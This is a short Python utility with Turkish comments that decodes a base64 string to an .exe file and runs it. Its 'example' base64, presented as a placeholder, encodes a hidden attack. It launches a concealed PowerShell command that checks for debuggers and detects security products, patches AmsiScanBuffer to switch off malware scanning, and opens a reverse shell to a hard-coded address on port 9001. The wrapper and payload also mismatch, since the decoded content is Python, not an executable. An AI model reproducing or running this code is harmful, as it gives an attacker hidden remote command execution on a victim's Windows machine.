import base64
import subprocess
import os

def base64_to_exe_and_run(base64_string, exe_path="output.exe"):
    # 1. Base64 string'i decode et (bytes olur)
    binary_data = base64.b64decode(base64_string)
    
    # 2. Binary dosyayı diske yaz
    with open(exe_path, "wb") as f:
        f.write(binary_data)
    
    # 3. Dosyayı çalıştır (Windows için)
    try:
        subprocess.run([exe_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Executable çalıştırılırken hata: {e}")

if __name__ == "__main__":
    # Örnek base64 (buraya kendi base64'ünü koy)
    example_base64 = """aW1wb3J0IHdtaSxiYXNlNjQgYXMgYjtjPXdtaS5XTUkoKTtwcz1yJycnZnVuY3Rpb24gSnVua0RlbGF5e1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgKEdldC1SYW5kb20gLU1pbmltdW0gNTAwIC1NYXhpbXVtIDE1MDApfWZ1bmN0aW9uIEFudGlEZWJ1Z3skZD1AKCdvbGx5ZGJnJywnaWRhJywneDY0ZGJnJywnd2luZGJnJywncHJvY2Vzc2hhY2tlcicsJ3Byb2Ntb24nLCdwcm9jbW9uNjQnLCdmaWRkbGVyJywnd2lyZXNoYXJrJywnaW1tdW5pdHlkZWJ1Z2dlcicpO2ZvcmVhY2goJHAgaW4gR2V0LVByb2Nlc3Mpe2ZvcmVhY2goJGRiZyBpbiAkZCl7aWYoJHAuUHJvY2Vzc05hbWUuVG9Mb3dlcigpIC1saWtlICIqJGRiZyoiKXtleGl0fX19SnVua0RlbGF5fWZ1bmN0aW9uIEhleFRvU3RyKCRoKXskYj1mb3IoJGk9MDskaSAtbHQgJGguTGVuZ3RoOyRpKz00KXtbQ29udmVydF06OlRvQnl0ZSgkaC5TdWJzdHJpbmcoJGksNCksMTYpfTtbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkYil9JGg9IjAwNDgwMDRCMDA0YzAwM2EwMDVjMDA1MyIrIjAwNGYwMDQ2MDA1NDAwNTcwMDQxMDA1MjAwNDUwMDVjMDA0ZDAwNjkwMDYzMDA3MjAwNmYwMDczMDA2ZjAwNjYiKyIwMDc0MDA1YzAwNTMwMDY1MDA2MzAwNzUwMDcyMDA2OTAwNzQwMDc5MDAyMDAwNDMwMDY1MDA2ZTAwNzQwMDY1IisiMDA3MjAwNWMwMDUwMDA3MjAwNmYwMDc2MDA2OTAwNjQwMDY1MDA3MjAwNWMwMDQxMDA1NjAwIjskcj1IZXhUb1N0ciAkaDtmdW5jdGlvbiBEZXRlY3RFRFJ7JHY9QCgnU2VudGluZWxPbmUnLCdDcm93ZFN0cmlrZScsJ0NhcmJvbkJsYWNrJywnTWljcm9zb2Z0IERlZmVuZGVyJyk7JGY9JGZhbHNlO2ZvcmVhY2goJGsgaW4gR2V0LUNoaWxkSXRlbSAkciAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSl7dHJ5eyRwPUdldC1JdGVtUHJvcGVydHkgJGsuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlO2ZvcmVhY2goJHggaW4gJHYpe2lmKCRwLkRpc3BsYXlOYW1lIC1saWtlICIqJHgqIil7JGY9JHRydWU7YnJlYWt9fWlmKCRmKXticmVha319Y2F0Y2h7fX1yZXR1cm4gJGZ9O0FkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAInVzaW5nIFN5c3RlbTt1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7cHVibGljIGNsYXNzIEF7W0RsbEltcG9ydChcImtlcm5lbDMyLmRsbFwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsc3RyaW5nIHByb2NOYW1lKTtbRGxsSW1wb3J0KFwia2VybmVsMzIuZGxsXCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7W0RsbEltcG9ydChcImtlcm5lbDMyLmRsbFwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsVUludFB0ciBkd1NpemUsdWludCBmbE5ld1Byb3RlY3Qsb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpO3B1YmxpYyBzdGF0aWMgdm9pZCBQKCl7SW50UHRyIGE9R2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKFwiYW1zaS5kbGxcIiksXCJBbXNpU2NhbkJ1ZmZlclwiKTt1aW50IG87VmlydHVhbFByb3RlY3QoYSwoVUludFB0cikweDEwLDB4NDAsb3V0IG8pO2J5dGVbXSBwPW5ldyBieXRlW117MHgzMSwweEMwLDB4QzN9O1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsLkNvcHkocCwwLGEscC5MZW5ndGgpO1ZpcnR1YWxQcm90ZWN0KGEsKFVJbnRQdHIpMHgxMCxvLG91dCBvKTt9fSJAOyAkTEhPU1RfYjY0PSJNVGt5TGpFMk9DNHhMalE0IjskTFBPUlRfYjY0PSJPVEF3TVE9PSI7ZnVuY3Rpb24gRCgkcyl7W1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkcykpfWZ1bmN0aW9uIFJSU3skaD1EICRMSE9TVF9iNjQ7JHA9W2ludF0oRCAkTFBPUlRfYjY0KTt0cnl7JGM9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRoLCRwKTskcz0kYy5HZXRTdHJlYW0oKTskdz1OZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoJHMpOyRyPU5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkcyk7JHcuQXV0b0ZsdXNoPSR0cnVlO3doaWxlKCR0cnVlKXskY21kPSRyLlJlYWRMaW5lKCk7aWYoISRjbWQpe2JyZWFrfSRwcj1TdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCBcImNtZC5leGVcIiAtQXJndW1lbnRMaXN0IFwiL2MgJGNtZFwiIC1Ob05ld1dpbmRvdyAtUmVkaXJlY3RTdGFuZGFyZE91dHB1dCBwaXBlIC1SZWRpcmVjdFN0YW5kYXJkRXJyb3IgcGlwZSAtUGFzc1RocnU7JG89JHByLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpOyRlPSRwci5TdGFuZGFyZEVycm9yLlJlYWRUb0VuZCgpOyR3LldyaXRlTGluZSgkbyskZSl9JGMuQ2xvc2UoKX1jYXRjaHt9fUFudGlEZWJ1ZztKdW5rRGVsYXk7aWYoRGV0ZWN0RURSKXskaz1bZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpO05ldy1JdGVtIC1QYXRoICgkcitcIlxcXCIrJGspIC1Gb3JjZXxPdXQtTnVsbDtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICgkcitcIlxcXCIrJGspIC1OYW1lIFwiRGlzcGxheU5hbWVcIiAtVmFsdWUgXCJTdXBlclNlY3VyZUFnZW50XCI7SnVua0RlbGF5fVtBXTo6UCgpO1JSUwonJycKY21kPWYicG93ZXJzaGVsbC5leGUgLXdpbmRvd3N0eWxlIGhpZGRlbiAtZW5jb2RlZGNvbW1hbmQge2IuYjY0ZW5jb2RlKHBzLmVuY29kZSgndXRmLTE2bGUnKSkuZGVjb2RlKCl9IgpwaWQscmV0PWMuV2luMzJfUHJvY2Vzcy5DcmVhdGUoY21kKQpwcmludChmJ3siWytdIFByb2Nlc3MgY3JlYXRlZCBQSUQ6ICIrc3RyKHBpZCkgaWYgcmV0PT0wIGVsc2UgIlstXSBQcm9jZXNzIGNyZWF0aW9uIGZhaWxlZDogIitzdHIocmV0KX0nKQo="""

    base64_to_exe_and_run(example_base64)
